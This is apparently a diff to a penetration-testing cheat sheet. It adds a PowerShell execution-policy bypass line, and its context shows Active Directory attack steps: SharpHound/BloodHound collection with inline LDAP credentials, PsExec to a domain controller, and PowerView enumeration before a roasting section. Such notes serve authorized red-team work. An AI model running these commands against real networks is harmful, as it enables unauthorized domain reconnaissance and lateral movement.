@@ -340,6 +340,7 @@ Bloodhound
 cd C:\Windows\Temp  
 copy \\192.168.162.46\share\SharpHound.exe  
 copy \\192.168.162.46\share\SharpHound.ps1 
+powershell -nop -noexit -exec bypass
 PS> Import-Module .\SharpHound.ps1 
 PS> Invoke-BloodHound -CollectionMethod All 
 PS> Invoke-Bloodhound -collectionmethod all -domain mike.com -ldapuser svc-acct -ldappass paxxword
@@ -366,7 +367,7 @@ PS> PsExec.exe \\mydc cmd.exe
 ===================================
 Domain Enums with PowerView 
 
-powershell.exe -nop -exec bypass  
+powershell.exe -nop -exec bypass
 Import-Module .\PowerView.ps1  
 
 Roast 
